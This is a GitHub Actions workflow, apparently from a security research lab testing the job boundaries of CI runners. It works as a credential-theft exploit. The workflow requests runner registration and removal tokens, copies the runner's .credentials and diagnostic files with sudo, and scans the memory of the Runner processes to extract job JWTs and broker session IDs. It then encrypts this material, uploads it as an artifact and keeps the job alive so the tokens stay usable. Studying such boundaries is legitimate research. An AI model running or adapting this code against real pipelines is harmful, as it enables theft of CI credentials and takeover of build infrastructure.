name: f004-pipelines-job-boundary

on:
  workflow_dispatch:

permissions:
  actions: write
  contents: read

jobs:
  controlled-jobs:
    strategy:
      fail-fast: false
      matrix:
        side: [A]
    name: controlled-${{ matrix.side }}
    runs-on: ubuntu-latest
    timeout-minutes: 15
    env:
      F004_CAPTURE_CERT: ${{ secrets.F004_CAPTURE_CERT }}
      F004_GITHUB_JOB_TOKEN: ${{ github.token }}
      F004_SIDE: ${{ matrix.side }}
    steps:
      - name: Emit unique controlled canary
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          canary="F004-PIPELINES-${GITHUB_RUN_ID}-${F004_SIDE}-$(openssl rand -hex 24)"
          printf '%s\n' "$canary" > "$RUNNER_TEMP/f004-runtime-canary.txt"
          printf 'F004_RUNTIME_CANARY side=%s value=%s\n' "$F004_SIDE" "$canary"

      - name: Capture encrypted job authority
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          test -n "$F004_CAPTURE_CERT"
          raw="$RUNNER_TEMP/f004-pipelines-raw"
          sealed="$RUNNER_TEMP/f004-pipelines-sealed"
          mkdir -p "$raw/runner-bootstrap" "$sealed"
          sleep 10

          capture_api_request() {
            local label=$1
            local method=$2
            local url=$3
            local response_dir="$raw/runner-bootstrap"
            curl --location --silent --show-error \
              --request "$method" \
              --header "Authorization: Bearer $F004_GITHUB_JOB_TOKEN" \
              --header 'Accept: application/vnd.github+json' \
              --header 'X-GitHub-Api-Version: 2022-11-28' \
              --dump-header "$response_dir/$label.headers" \
              --output "$response_dir/$label.body" \
              --write-out '%{http_code}\n' \
              "$url" > "$response_dir/$label.status"
          }

          capture_api_request \
            registration-token \
            POST \
            'https://api.github.com/repos/chawdamrunal/runner-lab/actions/runners/registration-token'
          capture_api_request \
            remove-token \
            POST \
            'https://api.github.com/repos/chawdamrunal/runner-lab/actions/runners/remove-token'

          listener_pid=$(pgrep -o -f 'Runner.Listener')
          test -n "$listener_pid"
          runner_root=$(dirname "$(dirname "$(sudo readlink -f "/proc/$listener_pid/exe")")")
          sudo cp "$runner_root/.credentials" "$raw/.credentials"
          sudo cp "$runner_root/.runner" "$raw/.runner"
          sudo cp -a "$runner_root/_diag" "$raw/runner-diag"
          cp "$RUNNER_TEMP/f004-runtime-canary.txt" "$raw/runtime-canary.txt"
          ps -eo user,pid,ppid,stat,lstart,args ww > "$raw/processes.txt"
          pipelines_url=$(sudo grep -hEo \
            'https://pipelines[A-Za-z0-9.-]+\.actions\.githubusercontent\.com/[A-Za-z0-9_-]+/' \
            "$runner_root"/_diag/Worker_*.log | sort -u)
          test "$(printf '%s\n' "$pipelines_url" | sed '/^$/d' | wc -l)" -eq 1

          sudo python3 - "$raw/authority.json" "$GITHUB_RUN_ID" "$pipelines_url" <<'PY'
          import base64
          import hashlib
          import json
          import os
          import pathlib
          import re
          import subprocess
          import sys

          jwt_re = re.compile(
              rb'eyJ[A-Za-z0-9_-]{8,4096}\.[A-Za-z0-9_-]{8,8192}\.'
              rb'[A-Za-z0-9_-]{8,4096}'
          )
          session_re = re.compile(
              rb'GET /message\?sessionId=([0-9a-fA-F-]{36})'
          )

          def claims(token):
              try:
                  part = token.split(b'.')[1]
                  part += b'=' * (-len(part) % 4)
                  return json.loads(base64.urlsafe_b64decode(part))
              except Exception:
                  return None

          tokens = {}
          sessions = set()
          pids = subprocess.run(
              ['pgrep', '-f', 'Runner.Listener|Runner.Worker'],
              capture_output=True,
              text=True,
              check=False,
          ).stdout.split()
          for pid_text in pids:
              pid = int(pid_text)
              try:
                  comm = pathlib.Path(f'/proc/{pid}/comm').read_text().strip()
                  maps = pathlib.Path(f'/proc/{pid}/maps').read_text().splitlines()
                  mem = open(f'/proc/{pid}/mem', 'rb', buffering=0)
              except OSError:
                  continue
              if 'Runner' not in comm:
                  mem.close()
                  continue
              with mem:
                  for line in maps:
                      fields = line.split()
                      if len(fields) < 2 or 'r' not in fields[1]:
                          continue
                      start_text, end_text = fields[0].split('-')
                      start, end = int(start_text, 16), int(end_text, 16)
                      if end <= start or end - start > 1024 * 1024 * 1024:
                          continue
                      position, overlap = start, b''
                      while position < end:
                          size = min(1024 * 1024, end - position)
                          try:
                              chunk = os.pread(mem.fileno(), size, position)
                          except OSError:
                              break
                          data = overlap + chunk
                          for token in jwt_re.findall(data):
                              parsed = claims(token)
                              if (
                                  isinstance(parsed, dict)
                                  and str(parsed.get('run_id', '')) == sys.argv[2]
                                  and 'Actions.Runner:' in str(parsed.get('scp', ''))
                              ):
                                  tokens[token] = parsed
                          if comm == 'Runner.Listener':
                              sessions.update(
                                  item.decode().lower()
                                  for item in session_re.findall(data)
                              )
                          overlap = data[-262144:]
                          position += size

          if len(tokens) != 1:
              raise SystemExit(f'expected one job token, found {len(tokens)}')
          if len(sessions) != 1:
              raise SystemExit(f'expected one Broker session, found {len(sessions)}')
          token, parsed = next(iter(tokens.items()))
          result = {
              'token': token.decode(),
              'token_sha256': hashlib.sha256(token).hexdigest(),
              'token_exp': parsed.get('exp'),
              'scope': parsed.get('scp'),
              'plan_id': parsed.get('plan_id'),
              'timeline_id': parsed.get('plan_id'),
              'job_id': parsed.get('job_id'),
              'orchestration_id': parsed.get('orch_id'),
              'runner_id': parsed.get('runner_id'),
              'pipelines_service_url': sys.argv[3],
              'broker_session': next(iter(sessions)),
          }
          pathlib.Path(sys.argv[1]).write_text(json.dumps(result, indent=2) + '\n')
          PY

          sudo chown -R "$USER:$USER" "$raw"
          python3 - "$raw" "$sealed/metadata.json" <<'PY'
          import hashlib
          import json
          import os
          import pathlib
          import sys

          raw = pathlib.Path(sys.argv[1])
          canary = (raw / 'runtime-canary.txt').read_bytes().rstrip(b'\n')
          authority = json.loads((raw / 'authority.json').read_text())
          pathlib.Path(sys.argv[2]).write_text(json.dumps({
              'repository': os.environ['GITHUB_REPOSITORY'],
              'run_id': os.environ['GITHUB_RUN_ID'],
              'side': os.environ['F004_SIDE'],
              'runner_name': os.environ['RUNNER_NAME'],
              'job_id': authority['job_id'],
              'plan_id': authority['plan_id'],
              'token_sha256': authority['token_sha256'],
              'canary_sha256': hashlib.sha256(canary).hexdigest(),
              'canary_length': len(canary),
          }, indent=2) + '\n')
          PY

          printf '%s\n' "$F004_CAPTURE_CERT" > "$RUNNER_TEMP/f004-certificate.pem"
          tar -C "$raw" -cf "$RUNNER_TEMP/f004-pipelines.tar" .
          openssl cms -encrypt -binary -aes-256-cbc \
            -in "$RUNNER_TEMP/f004-pipelines.tar" \
            -outform DER \
            -out "$sealed/payload.cms" \
            "$RUNNER_TEMP/f004-certificate.pem"
          shasum -a 256 "$sealed/payload.cms" | awk '{print $1}' \
            > "$sealed/payload.cms.sha256"
          shred -u "$RUNNER_TEMP/f004-pipelines.tar" "$RUNNER_TEMP/f004-certificate.pem"
          sudo rm -rf "$raw"

      - name: Upload encrypted authority
        uses: actions/upload-artifact@v4
        with:
          name: f004-pipelines-${{ matrix.side }}-${{ github.run_id }}
          path: ${{ runner.temp }}/f004-pipelines-sealed
          retention-days: 1
          compression-level: 0

      - name: Hold controlled job live
        shell: bash
        run: sleep 600
